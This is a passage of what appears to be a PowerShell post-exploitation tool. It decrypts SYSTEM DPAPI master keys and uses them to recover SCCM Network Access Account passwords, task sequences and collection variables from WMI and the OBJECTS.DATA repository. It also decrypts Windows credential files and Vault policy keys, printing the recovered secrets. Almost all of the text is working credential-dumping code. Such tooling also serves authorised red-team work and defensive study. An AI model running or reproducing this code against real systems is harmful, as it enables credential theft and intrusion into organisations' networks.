                return $decryptor.TransformFinalBlock($ciphertext, 0, $ciphertext.Length)
            }
            catch
            {
                Write-Warning "AES decryption failed: $_"
                return $null
            }
            
            finally
            {
                if ($aes)
                { 
                    $aes.Dispose()
                }
            }
        }
        
        default 
        {
            return "[!] Unsupported algorithm: $algId"
        }
    }
}

enum CryptAlg {
    CALG_SHA1     = 32772
    CALG_SHA_512  = 32782
    CALG_AES_256  = 26128
    CALG_3DES     = 26115
}


function Is-Unicode {
    param ([byte[]] $bytes)

     # Helper that checks if byte array contains Unicode data. Used during blob decryption analysis.

    if ($bytes.Length -lt 2)
    {
        return $false
    }

    # Check for UTF-16 LE/BE BOM or even-length characteristic
    return (
        ($bytes[0] -eq 0xFF -and $bytes[1] -eq 0xFE) -or  # UTF-16 LE BOM
        ($bytes[0] -eq 0xFE -and $bytes[1] -eq 0xFF) -or  # UTF-16 BE BOM
        ($bytes.Length % 2 -eq 0)                         # Even-length data
    )
}

function Decrypt-NAA {
    param ([string] $Blob, [hashtable] $MasterKeys)

    # Decrypts Network Access Account (NAA) credential blobs from SCCM using DPAPI master keys.
    # Hand-off: Uses Describe-DPAPIBlob. Returns cleartext to Decrypt-LocalNetworkAccessAccountsWmi.

    $size               = [int]($Blob.Length / 2)
    [byte[]] $blobBytes = New-Object byte[] $size

    for ($i = 0; $i -lt $Blob.Length; $i += 2)
    {
        $blobBytes[$i / 2] = [Convert]::ToByte($Blob.Substring($i, 2), 16)
    }

    $offset          = 4
    $size2           = [int]($Blob.Length / 2)
    [byte[]] $unmanagedArray = New-Object byte[] $size2
    [System.Buffer]::BlockCopy($blobBytes, 4, $unmanagedArray, 0, $blobBytes.Length - $offset)
    $blobBytes       = $unmanagedArray

    if ($blobBytes.Length -gt 0)
    {
        [byte[]] $decBytesRaw = Describe-DPAPIBlob $blobBytes $MasterKeys

        if ($decBytesRaw -ne $null -and $decBytesRaw.Length -ne 0)
        {
            if (Is-Unicode $decBytesRaw)
            {
                $finalIndex = [Array]::LastIndexOf($decBytesRaw, [byte]0)
                
                if ($finalIndex -gt 1)
                {
                    $decBytes = New-Object byte[] ($finalIndex + 1)
                    [System.Array]::Copy($decBytesRaw, 0, $decBytes, 0, $finalIndex)
                    $data = [System.Text.Encoding]::Unicode.GetString($decBytes)

                  # Write-Host "    dec(blob)        : $data"
                    
                    return $data
                }
                
                else
                {
                    $data = [System.Text.Encoding]::ASCII.GetString($decBytesRaw)
                    if ($TaskSequence){ return $data }
                  
                  # Write-Host "    dec(blob)        : $data"
                    
                    return $data
                }
            }
            
            else
            {
                $hexData = ($decBytesRaw | ForEach-Object { $_.ToString("X2") }) -join " "
              
              # Write-Host "    dec(blob)        : $hexData"
                
                return $hexData
            }
        }
        
        else
        {
            return $null
        }
    }
    
    else
    {
        return $null
    }
}


function Triage-SystemMasterKeys {

    # Recursively searches for DPAPI master keys on disk and decrypts them using system DPAPI keys.
    # Hand-off: Uses Get-DPAPIKeys, Decrypt-MasterKeyWithSha. Returns GUID:key mapping to decryption functions.

    if ($global:mappings -and $global:mappings.Count -gt 0)
    {
        return $global:mappings
    }

    $global:mappings = @{}
    $dpapiKeys       = Get-DPAPIKeys

    $rootPath = "$env:SystemRoot\System32\Microsoft\Protect\"

    Get-ChildItem -Path $rootPath -Recurse -Force | Where-Object { -not $_.PSIsContainer } | ForEach-Object {
        
        if ([Regex]::IsMatch($_.Name, "^(\{{0,1}([0-9a-fA-F]){8}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){4}-([0-9a-fA-F]){12}\}{0,1})$"))
        {
            try
            {
                $masterKeyBytes  = [IO.File]::ReadAllBytes($_.FullName)
                $parentDir       = $_.Directory.Name
                $grandParentDir  = $_.Directory.Parent.Name

                if     ($parentDir -eq 'User')           { $shaBytes = $dpapiUserKeysBytes    }
                elseif ($parentDir -eq 'Machine')        { $shaBytes = $dpapiMachineKeysBytes }
                elseif ($grandParentDir -like 'S-1-5-*') { $shaBytes = $dpapiUserKeysBytes    }
                else                                     { $shaBytes = $dpapiMachineKeysBytes }

                $plainTextMasterKey = Decrypt-MasterKeyWithSha -MasterKeyBytes $masterKeyBytes -SHABytes $shaBytes

                foreach ($key in $plainTextMasterKey.Keys)
                {
                    $global:mappings[$key] = $plainTextMasterKey[$key]
                }
            }
            
            catch
            {
                Write-Host "[!] Error triaging $($_.FullName): $($_.Exception.Message)"
            }
        }
    }

    Write-Host "[*] SYSTEM master key cache:"
    
    foreach ($key in $global:mappings.Keys)
    {
        Write-Host "$key`:$($global:mappings[$key])"
    }
    
    Write-Host "`n`n"

    return $global:mappings
}

function Decrypt-LocalNetworkAccessAccountsWmi {
    param ([System.Collections.IEnumerable] $NetworkAccessAccounts, [hashtable] $MasterKeys)

    # Decrypts SCCM Network Access Account credentials retrieved via WMI.
    # Hand-off: Uses Triage-SystemMasterKeys and Decrypt-NAA. Outputs credentials to console.

    Write-Host "[+] Decrypting network access account credentials`n"

    foreach ($account in $NetworkAccessAccounts)
    {
        try
        {
            $protectedUsername = ($account.NetworkAccessUsername -split '\[')[2] -split '\]' | Select-Object -First 1
            $protectedPassword = ($account.NetworkAccessPassword -split '\[')[2] -split '\]' | Select-Object -First 1

            $username = Decrypt-NAA -Blob $protectedUsername -MasterKeys $MasterKeys
            $password = Decrypt-NAA -Blob $protectedPassword -MasterKeys $MasterKeys

            if ($username -like "00 00 0E 0E 0E*" -or $password -like "00 00 0E 0E 0E*")
            {
                Write-Host "[!] SCCM is configured to use the client's machine account instead of NAA`n"
            }
            
            else
            {
                Write-Host "`n"
                
                Write-Host "    Network Access Username: $username"
                Write-Host "    Network Access Password: $password"
                
                Write-Host "`n"
            }
        }
        
        catch
        {
            Write-Host "[!] Error decrypting NAA credentials: $_"
        }
    }
}



function Format-XML {
    param ([xml]$xml, [int]$indent = 2)

    $StringWriter = New-Object System.IO.StringWriter
    $XmlWriter = New-Object System.Xml.XmlTextWriter $StringWriter
    $XmlWriter.Formatting = "indented"
    $XmlWriter.Indentation = $indent
    $xml.WriteContentTo($XmlWriter)
    $XmlWriter.Flush()
    $StringWriter.Flush()
    return $StringWriter.ToString()
}

function Decrypt-LocalTaskSequencesWMI {
    param ([array] $TaskSequences, [hashtable] $MasterKeys)

    Write-Host "[+] Decrypting Task Sequences`n"

    foreach ($taskSequence in $TaskSequences)
    {
        try
        {
            if ($taskSequence.TS_Sequence -match "<!\[CDATA\[([0-9A-F\s]+)\]\]>")
            {
                $hexData   = $matches[1] -replace '\s', ''
                $plaintext = Decrypt-NAA -Blob $hexData -MasterKeys $MasterKeys

                if ($plaintext -is [byte[]])
                {
                    $plaintext = [System.Text.Encoding]::UTF8.GetString($plaintext)
                }

                Write-Host "`n"
                Write-Host "[+]    Task Sequence: "
                Write-Host "`n"

                $xmlMatch = Select-String -InputObject $plaintext -Pattern "<sequence[^>]*?>.*?</sequence>" -AllMatches
                $xmlPrinted = $false

                if ($xmlMatch.Matches.Count -gt 0)
                {
                    foreach ($match in $xmlMatch.Matches)
                    {
                        try
                        {
                            $sequenceXml = [xml]$match.Value
                            Format-XML $sequenceXml | Write-Host -ForegroundColor Gray
                            $xmlPrinted = $true
                            Write-Host
                            
                            if ($global:NoSave)
                            {
                                continue
                            }
                            
                            $timestamp = Get-Date -Format "yyyy"
                            $Random = Get-Random -Minimum 1 -Maximum 10000
                            $cleanName = $taskSequence.Name -replace '[^\w\s-]', ''
                            $fileName = "TaskSequence_${cleanName}_${timestamp}_${Random}.xml"
                            
                            Start-Sleep -Milliseconds 10
                            $sequenceXml.Save((Join-Path -Path $pwd -ChildPath $fileName))
                            
                            Write-Host "`n"
                            Write-Host "[+]    Saved XML to: $fileName"
                        }
                        
                        catch
                        {
                            Write-Host "    [!] Extracted content is not valid XML"
                        }
                    }
                }

                if (-not $xmlPrinted)
                {
                    Write-Host "    Decrypted Value: $plaintext"
                }
                
                Write-Host "`n"
            }
            
            else
            {
                Write-Host "[!] No CDATA found in Task Sequence: $($taskSequence.Name)" -ForegroundColor "Yellow"
            }
        }
        
        catch
        {
            Write-Host "[!] Error decrypting Task Sequence '$($taskSequence.Name)': $_" -ForegroundColor "Yellow"
        }
    }
}



function Triage-SccmWMI {
    param ([hashtable]$MasterKeys)

    # Main orchestrator for SCCM secret decryption via WMI. Retrieves NAA/Task Sequences and triggers decryption.
    # Hand-off: Calls Triage-SystemMasterKeys, Decrypt-LocalNetworkAccessAccountsWmi, and Decrypt-LocalTaskSequencesWMI.

    $naa        = @(Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class CCM_NetworkAccessAccount -ErrorAction SilentlyContinue)
    $tasks      = @(Get-WmiObject -Namespace "root\ccm\policy\Machine\ActualConfig" -Class CCM_TaskSequence         -ErrorAction SilentlyContinue)

    if ($naa.Count -gt 0)
    {
        Write-Host "[+] Found $($naa.Count) Network Access Account(s)"
        Decrypt-LocalNetworkAccessAccountsWmi -NetworkAccessAccounts $naa -MasterKeys $MasterKeys
    }
    
    else
    {
        Write-Host "[!] No Network Access Accounts found"
    }

    if ($tasks.Count -gt 0)
    {
        Write-Host "[+] Found $($tasks.Count) Task Sequence(s)"
        Decrypt-LocalTaskSequencesWMI -TaskSequences $tasks -MasterKeys $MasterKeys
    }
    
    else
    {
        Write-Host "[!] No Task Sequences found"
    }
}

function Triage-SccmDisk {
    param ([hashtable] $Masterkeys)

    # Reads and parses the CIM repository OBJECTS.DATA file for SCCM policy secrets,
    # matches secret types using regex, and attempts DPAPI decryption using discovered master keys.
    # Outputs each decrypted secret type in a readable format.

    # Determine OBJECTS.DATA path based on architecture
    $Path = "$env:SystemDrive\Windows\Sysnative\Wbem\Repository\OBJECTS.DATA"
    if (-not [System.IO.File]::Exists($Path))
    {
        $Path = "$env:SystemDrive\Windows\System32\Wbem\Repository\OBJECTS.DATA"
    }

    if ([System.IO.File]::Exists($Path))
    {
        $fs       = [System.IO.FileStream]::new($Path, [System.IO.FileMode]::Open, [System.IO.FileAccess]::Read, [System.IO.FileShare]::ReadWrite)
        $sr       = [System.IO.StreamReader]::new($fs, [System.Text.Encoding]::Default)
        $fileData = $sr.ReadToEnd()
        $sr.Close()
        $fs.Close()
    }
    else
    {
        Write-Host "`n[!] OBJECTS.DATA does not exist or is not readable`n"
        return
    }

    # Define regex patterns to match in OBJECTS.DATA
    $regexes = @{
        "networkAccessAccounts" = [regex]::new(
            'CCM_NetworkAccessAccount.*<PolicySecret Version="1"><!\[CDATA\[(?<NetworkAccessPassword>.*?)\]\]></PolicySecret>.*<PolicySecret Version="1"><!\[CDATA\[(?<NetworkAccessUsername>.*?)\]\]></PolicySecret>',
            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
        )
        "taskSequences" = [regex]::new(
            '</SWDReserved>.*<PolicySecret Version="1"><!\[CDATA\[(?<TaskSequence>.*?)\]\]></PolicySecret>',
            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
        )
        "collectionVariables" = [regex]::new(
            'CCM_CollectionVariable\x00\x00(?<CollectionVariableName>.*?)\x00\x00.*<PolicySecret Version="1"><!\[CDATA\[(?<CollectionVariableValue>.*?)\]\]></PolicySecret>',
            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
        )
        "allSecrets" = [regex]::new(
            '<PolicySecret Version="1"><!\[CDATA\[(?<OtherSecret>.*?)\]\]></PolicySecret>',
            [System.Text.RegularExpressions.RegexOptions]::Multiline -bor
            [System.Text.RegularExpressions.RegexOptions]::IgnoreCase
        )
    }

    $matches = @{
        "network access account" = @($regexes["networkAccessAccounts"].Matches($fileData))
        "task sequence"          = @($regexes["taskSequences"].Matches($fileData))
        "collection variable"    = @($regexes["collectionVariables"].Matches($fileData))
        "other"                  = @($regexes["allSecrets"].Matches($fileData))
    }

    if ($matches["other"].Count -gt 0)
    {
        $MasterKeys = Triage-SystemMasterKeys
        $seenBlobs = @{}

        foreach ($matchKeyValuePair in $matches.GetEnumerator())
        {
            if ($matchKeyValuePair.Value.Count -gt 0)
            {
                Write-Host "`n[+] Decrypting $($matchKeyValuePair.Value.Count) $($matchKeyValuePair.Key) secrets"

                for ($index = 0; $index -lt $matchKeyValuePair.Value.Count; $index++)
                {
                    $match = $matchKeyValuePair.Value[$index]
                    for ($idxGroup = 1; $idxGroup -lt $match.Groups.Count; $idxGroup++)
                    {
                        $groupName  = $match.Groups[$idxGroup].Name
                        $groupValue = $match.Groups[$idxGroup].Value

                        # Deduplication: skip if this blob has already been processed
                        # Likely this can stay but should test this on a larger number of machines to ensure we are not skipping data
                        if ($seenBlobs.ContainsKey($groupValue)) { continue }
                        $seenBlobs[$groupValue] = $true

                        try
                        {
                            if ($groupName -eq "CollectionVariableName")
                            {
                                $collectionVariableValue = Decrypt-NAA -Blob $match.Groups[$idxGroup + 1].Value -MasterKeys $MasterKeys
                                Write-Host "`n    CollectionVariableName:  $groupValue"
                                Write-Host "    CollectionVariableValue: $collectionVariableValue"
                            }

                            elseif ($groupName -eq "NetworkAccessPassword")
                            {
                                $networkAccessUsername = Decrypt-NAA -Blob $match.Groups[$idxGroup + 1].Value -MasterKeys $MasterKeys
                                $networkAccessPassword = Decrypt-NAA -Blob $groupValue -MasterKeys $MasterKeys
                                Write-Host "`n    NetworkAccessUsername: $networkAccessUsername"
                                Write-Host "    NetworkAccessPassword: $networkAccessPassword"
                                Write-Host
                                if ($networkAccessUsername -like "00 00 0E 0E 0E*" -or $networkAccessPassword -like "00 00 0E 0E 0E*")
                                {
                                    Write-Host "    [!] At the point in time this secret was downloaded, SCCM was configured to use the client's machine account instead of NAA"
                                }
                            }


                            elseif ($groupName -eq "CollectionVariableValue" -or $groupName -eq "NetworkAccessUsername")
                            {

                            }

                            else 
                            {
                                $secretPlaintext = Decrypt-NAA -Blob $groupValue -MasterKeys $MasterKeys
                                $xmlMatch = Select-String -InputObject $secretPlaintext -Pattern "<sequence[^>]*?>.*?</sequence>" -AllMatches
                                $xmlPrinted = $false
    
                                if ($xmlMatch.Matches.Count -gt 0)
                                {
                                    
                                    foreach ($match in $xmlMatch.Matches) 
                                    {
                                    
                                        Write-Host "`n"
                                        $sequenceXml = [xml]$match.Value
                                        Format-XML $sequenceXml | Write-Host -ForegroundColor "Gray"

                                        if ($Global:NoSave)
                                        {
                                            Continue
                                        }

                                        else
                                        {
                                            $timestamp = Get-Date -Format "yyyy"
                                            $Random = Get-Random -Minimum 1 -Maximum 10000
                                            $cleanName = $taskSequence.Name -replace '[^\w\s-]', ''
                                            $fileName = "TaskSequence_${cleanName}_${timestamp}_${Random}.xml"
                            
                                            Start-Sleep -Milliseconds 10
                                            $sequenceXml.Save((Join-Path -Path $pwd -ChildPath $fileName))

                                            Write-Host "`n"
                                            Write-Host "[+]    Saved XML to: $fileName"
                                        }
                                    }
                                    
                                    $xmlPrinted = $true
                                }
                            
                           if (-not $xmlPrinted)
                            {
                                # Not sure how needed this is.. At this point this is usually garbage data that only serves to clutter the output
                                #Write-Host "`n    Plaintext secret: $secretPlaintext"
                            }
                           
                           }

                        }
                        
                        catch
                        {
                            Write-Host "`n[!] Data was not decrypted (Redacted Output)"

                            $LimitLength = [Math]::Min(100, $groupValue.Length)
                            Write-Host "$($groupValue.Substring(0, $($LimitLength)))..."
                            Write-Host "`n"
                        }
                    }
                }
            }
        }
    }
    else
    {
        Write-Host "[!] No policy secrets found"
    }

    Write-Host "`n"
}

function Triage-SystemCreds {
    param([hashtable]$MasterKeys)

    # Orchestrates system credential enumeration and decryption across multiple Windows service profiles.
    # Hand-off: Calls Triage-CredFolder for each credential location, which triggers Triage-CredFile and Parse-DecCredBlob.

    Write-Host "`n[*] Triaging System Credentials`n"

    $folderLocations = @(
        "${env:SystemRoot}\System32\config\systemprofile\AppData\Local\Microsoft\Credentials",
        "${env:SystemRoot}\System32\config\systemprofile\AppData\Roaming\Microsoft\Credentials",
        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Local\Microsoft\Credentials",
        "${env:SystemRoot}\ServiceProfiles\LocalService\AppData\Roaming\Microsoft\Credentials",
        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Local\Microsoft\Credentials",
        "${env:SystemRoot}\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Credentials"
    )

    foreach ($location in $folderLocations)
    {
        if (Test-Path -Path $location -PathType Container)
        {
            Write-Host
            Write-Host "Folder       : $location"
            Triage-CredFolder -Folder $location -MasterKeys $MasterKeys
        }
    }
}


function Triage-CredFile {
    param ([string] $CredFilePath, [hashtable]$MasterKeys)

    # Processes individual credential files by reading and initiating DPAPI blob decryption.
    # Hand-off: Calls Describe-Credential with credential file bytes and master keys for decryption.

    $FileName = [System.IO.Path]::GetFileName($CredFilePath)
    Write-Host "`n"
    Write-Host "  CredFile           : $FileName"
    try
    {
        $CredentialArray = [System.IO.File]::ReadAllBytes($CredFilePath)
        Describe-Credential $CredentialArray $MasterKeys
    }
    catch
    {
        Write-Host "    [!] ERROR processing file: $CredFilePath"
        Write-Host "        Exception: $($_.Exception.Message)"
    }
}


function Triage-CredFolder {
    param ([string]$Folder, [hashtable]$MasterKeys)

    # Enumerates credential files within a specified folder and processes each one.
    # Hand-off: Calls Triage-CredFile for each credential file found in the target directory.

    if ([string]::IsNullOrEmpty($Folder) -or -not (Test-Path -Path $Folder -PathType Container))
    {
        Write-Host "Folder       : $Folder (does not exist or invalid path)"
        return
    }

    $SystemFiles = [System.IO.Directory]::GetFiles($Folder)
    if ($SystemFiles.Length -eq 0)
    {
        Write-Host "Folder       : $Folder (no files found)"
        return
    }

    foreach ($File in $SystemFiles)
    {
        try
        {
            Triage-CredFile -CredFilePath $File -MasterKeys $MasterKeys
        }
        catch
        {
            Write-Host "    [!] ERROR processing file: $File"
            Write-Host "        Exception: $($_.Exception.Message)"
        }
    }
}


function Describe-Credential {
    param([byte[]]$CredentialBytes, [hashtable]$MasterKeys)

    # Initiates DPAPI blob decryption for credential data and parses the decrypted result.
    # Hand-off: Calls Describe-DPAPIBlob for decryption, then Parse-DecCredBlob for credential parsing.

    $plaintextBytes = Describe-DPAPIBlob -Blobbytes $CredentialBytes -MasterKeys $MasterKeys -blobType "credential"
    if ($null -eq $plaintextBytes -or $plaintextBytes.Length -eq 0)
    {
        Write-Host "    [X] Decryption failed or returned no data."
        return
    }
    
    Parse-DecCredBlob -DecBlobBytes $plaintextBytes
}

function Parse-DecCredBlob {
    param([byte[]]$DecBlobBytes)

    # Parses decrypted credential blob structure to extract credential metadata and secrets.
    # Hand-off: Terminal function that outputs credential details including username, target, and password data.


    $offset = 0
    try
    {
        $credFlags = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $credSize = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $credUnk0 = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $type = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $flags = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4

        $lastWritten = [BitConverter]::ToInt64($DecBlobBytes, $offset)
        $offset += 8
        
        try
        {
            $lastWrittenTime = [DateTime]::FromFileTime($lastWritten)
            $currentDate = Get-Date
            
            if (($lastWrittenTime -lt $currentDate.AddYears(-20)) -or 
                ($lastWrittenTime -gt $currentDate.AddYears(1)))
            {
                Write-Host "    [!] Decryption failed, likely incorrect password for the associated masterkey"
                return
            }
        }
        catch
        {
            Write-Host "    [!] Decryption failed, likely incorrect password for the associated masterkey"
            return
        }

        $unkFlagsOrSize = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $persist = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $attributeCount = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $unk0 = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4
        $unk1 = [BitConverter]::ToUInt32($DecBlobBytes, $offset)
        $offset += 4

        $targetNameLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        $targetName = if ($targetNameLen -gt 0 -and $targetNameLen -le ($DecBlobBytes.Length - $offset))
        {
            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $targetNameLen)
        }
        else { "" }
        $offset += $targetNameLen

        $targetAliasLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        $targetAlias = if ($targetAliasLen -gt 0 -and $targetAliasLen -le ($DecBlobBytes.Length - $offset))
        {
            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $targetAliasLen)
        }
        else { "" }
        $offset += $targetAliasLen

        $commentLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        $comment = if ($commentLen -gt 0 -and $commentLen -le ($DecBlobBytes.Length - $offset))
        {
            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $commentLen)
        }
        else { "" }
        $offset += $commentLen

        $unkDataLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        $unkData = if ($unkDataLen -gt 0 -and $unkDataLen -le ($DecBlobBytes.Length - $offset))
        {
            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $unkDataLen)
        }
        else { "" }
        $offset += $unkDataLen

        $userNameLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        $userName = if ($userNameLen -gt 0 -and $userNameLen -le ($DecBlobBytes.Length - $offset))
        {
            [System.Text.Encoding]::Unicode.GetString($DecBlobBytes, $offset, $userNameLen)
        }
        else { "" }
        $offset += $userNameLen

        $credBlobLen = [BitConverter]::ToInt32($DecBlobBytes, $offset)
        $offset += 4
        $credBlobBytes = if ($credBlobLen -gt 0 -and $credBlobLen -le ($DecBlobBytes.Length - $offset))
        {
            $tmp = New-Object byte[] $credBlobLen
            [Array]::Copy($DecBlobBytes, $offset, $tmp, 0, $credBlobLen)
            $tmp
        }
        else { @() }
        $offset += $credBlobLen

        Write-Host "`n"
        Write-Host ("    guidMasterKey    : {0}" -f $global:CurrentGuidMasterKey)
        Write-Host ("    size             : {0}" -f $credSize)
        Write-Host ("    flags            : 0x{0:X8} (CRYPTPROTECT_SYSTEM)" -f $credFlags)
        Write-Host ("    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)")
        Write-Host ("    description      : Local Credential Data")
        Write-Host ("    LastWritten      : {0}" -f $lastWrittenTime)
        Write-Host ("    TargetName       : {0}" -f $targetName.Trim())
        Write-Host ("    TargetAlias      : {0}" -f $targetAlias.Trim())
        Write-Host ("    Comment          : {0}" -f $comment.Trim())
        Write-Host ("    UserName         : {0}" -f $userName.Trim())
        
        if ($credBlobBytes.Length -gt 0)
        {
            if (Is-Unicode $credBlobBytes)
            {
                $credBlob = [System.Text.Encoding]::Unicode.GetString($credBlobBytes)
                Write-Host ("    Credential       : {0}" -f $credBlob.Trim())
            }
            else
            {
                $credBlobByteString = ($credBlobBytes | ForEach-Object { "{0:X2}" -f $_ }) -join " "
                Write-Host ("    Credential       : {0}" -f $credBlobByteString.Trim())
            }
        }
        else
        {
            Write-Host ("    Credential       :")
        }

       Write-Host "`n"
    }
    catch
    {
        Write-Host "    [!] Error parsing decrypted credential blob: $($_.Exception.Message)"
    }
}


function AES-Decrypt {
    param ([byte[]] $key, [byte[]] $IV, [byte[]] $data)

    $aesCryptoProvider = [System.Security.Cryptography.AesManaged]::new()
    $aesCryptoProvider.Key = $key

    if ($IV.Length -ne 0)
    {
        $aesCryptoProvider.IV = $IV
    }

    $aesCryptoProvider.Mode = [Security.Cryptography.CipherMode]::CBC

    $plaintextBytes = $aesCryptoProvider.CreateDecryptor().TransformBlock($data, 0, $data.Length)

    return $plaintextBytes
}

function Parse-DecPolicyBlob {
    param ([byte[]]$decBlobBytes)

    function Find-ArrayIndex {
        param ([byte[]]$array, [byte[]]$pattern, [int]$startIndex = 0)

        for ($i = $startIndex; $i -le $array.Length - $pattern.Length; $i++)
        {
            $found = $true
            for ($j = 0; $j -lt $pattern.Length; $j++)
            {
                if ($array[$i + $j] -ne $pattern[$j])
                {
                    $found = $false
                    break
                }
            }
            if ($found)
            {
                return $i
            }
        }
        return -1
    }

    $keys = @()
    $s = [System.Text.Encoding]::ASCII.GetString($decBlobBytes, 12, 4)

    if ($s -eq 'KDBM')
    {
        $offset = 20

        $aes128len = [BitConverter]::ToInt32($decBlobBytes, $offset)
        $offset += 4

        if ($aes128len -ne 16)
        {
            Write-Warning "Error parsing decrypted Policy.vpol (aes128len != 16)"
            return $keys
        }

        $aes128Key = $decBlobBytes[$offset..($offset + $aes128len - 1)]
        $offset += $aes128len

        $offset += 20

        $aes256len = [BitConverter]::ToInt32($decBlobBytes, $offset)
        $offset += 4

        if ($aes256len -ne 32)
        {
            Write-Warning "Error parsing decrypted Policy.vpol (aes256len != 32)"
            return $keys
        }

        $aes256Key = $decBlobBytes[$offset..($offset + $aes256len - 1)]

        $keys += ,$aes128Key
        $keys += ,$aes256Key
    }
    else
    {
        $offset = 16
        $s2 = [System.Text.Encoding]::ASCII.GetString($decBlobBytes, $offset, 4)
        $offset += 4

        if ($s2 -eq 'KSSM')
        {
            $offset += 16

            $aes128len = [BitConverter]::ToInt32($decBlobBytes, $offset)
            $offset += 4

            if ($aes128len -ne 16)
            {
                Write-Warning "Error parsing decrypted Policy.vpol (aes128len != 16)"
                return $keys
            }

            $aes128Key = $decBlobBytes[$offset..($offset + $aes128len - 1)]
            $offset += $aes128len

            $pattern = 0x4b,0x53,0x53,0x4d,0x02,0x00,0x01,0x00,0x01,0x00,0x00,0x00
            $index = Find-ArrayIndex -array $decBlobBytes -pattern $pattern -startIndex $offset

            if ($index -ne -1)
            {
                $offset = $index + 20

                $aes256len = [BitConverter]::ToInt32($decBlobBytes, $offset)
                $offset += 4

                if ($aes256len -ne 32)
                {
                    Write-Warning "Error parsing decrypted Policy.vpol (aes256len != 32)"
                    return $keys
                }

                $aes256Key = $decBlobBytes[$offset..($offset + $aes256len - 1)]

                $keys += ,$aes128Key
                $keys += ,$aes256Key
            }
            else
            {
                Write-Warning "Error in decrypting Policy.vpol: second MSSK header not found!"
            }
        }
    }

    return $keys
}



function Describe-VaultPolicy {
    param([byte[]]$PolicyBytes, [hashtable]$MasterKeys)

    # Decrypts Windows Vault policy files to extract AES encryption keys for vault credential decryption.
    # Hand-off: Calls Describe-DPAPIBlob for policy decryption, then Parse-DecPolicyBlob for key extraction.

    $offset = 0

    $version = [BitConverter]::ToInt32($PolicyBytes, $offset)
    $offset += 4

    $vaultIDbytes = $PolicyBytes[$offset..($offset+15)]
    $vaultID = [Guid]::New([byte[]]$vaultIDbytes)
    $offset += 16

    Write-Host "`n  VaultID            : $vaultID"

    $nameLen = [BitConverter]::ToInt32($PolicyBytes, $offset)
    $offset += 4
    $name = [System.Text.Encoding]::Unicode.GetString($PolicyBytes, $offset, $nameLen)
    $offset += $nameLen
    Write-Host "  Name               : $name"

    # skip unk0/unk1/unk2
    $offset += 12

    $keyLen = [BitConverter]::ToInt32($PolicyBytes, $offset)
    $offset += 4

    # skip unk0/unk1 GUIDs
    $offset += 32

    $keyBlobLen = [BitConverter]::ToInt32($PolicyBytes, $offset)
    $offset += 4

    $blobBytes = $PolicyBytes[$offset..($offset + $keyBlobLen - 1)]
    $offset += $keyBlobLen

    $plaintextBytes = Describe-DPAPIBlob -blobBytes $blobBytes -MasterKeys $MasterKeys -Type "policy"

    if ($plaintextBytes -and $plaintextBytes.Length -gt 0) {
        $keys = Parse-DecPolicyBlob -decBlobBytes $plaintextBytes

        if ($keys.Count -eq 2) {
            Write-Host ("    guidMasterKey    : {0}" -f $global:CurrentGuidMasterKey)
            Write-Host ("    size             : {0}" -f $blobBytes.Length)
            Write-Host ("    flags            : 0x{0:X8} (CRYPTPROTECT_SYSTEM)" -f 0x20000000)
            Write-Host ("    algHash/algCrypt : 32782 (CALG_SHA_512) / 26128 (CALG_AES_256)")
            Write-Host ("    description      : Vault Policy Key")
            
            $aes128KeyStr = [BitConverter]::ToString($keys[0]).Replace("-", "")
            Write-Host "    aes128 key       : $aes128KeyStr"
            
            $aes256KeyStr = [BitConverter]::ToString($keys[1]).Replace("-", "")
            Write-Host "    aes256 key       : $aes256KeyStr"
            
            return $keys
        } 
        else {
            Write-Host "    [!] Error parsing decrypted Policy.vpol (AES keys not extracted, likely incorrect password for the associated masterkey)"
            return @()
        }
    } 
    else {
        Write-Host "    [!] Failed to decrypt Policy.vpol"
        return @()
    }
}

function Describe-VaultItem {
    param([byte[]]$VaultItemBytes)

    # Parses decrypted vault item structure to extract credential properties and values.
    # Hand-off: Terminal function that outputs vault credential details including resource, identity, and authenticator.

    $offset = 0
    $version = [BitConverter]::ToInt32($VaultItemBytes, $offset)
    $offset += 4
    $count = [BitConverter]::ToInt32($VaultItemBytes, $offset)
    $offset += 4
    $offset += 4 # skip unk

    for ($i = 0; $i -lt $count; ++$i) {
        $id = [BitConverter]::ToInt32($VaultItemBytes, $offset)
        $offset += 4
        $size = [BitConverter]::ToInt32($VaultItemBytes, $offset)
        $offset += 4
        $entryString = [System.Text.Encoding]::Unicode.GetString($VaultItemBytes, $offset, $size)
        $entryData = $VaultItemBytes[$offset..($offset + $size - 1)]
        $offset += $size

        switch ($id) {
            1 { Write-Host "    Resource         : $entryString" }
            2 { Write-Host "    Identity         : $entryString" }
            3 { Write-Host "    Authenticator    : $entryString" }
            default {
                if (Is-Unicode -Data $entryData) {
                    Write-Host "    Property $id     : $entryString"
                } else {
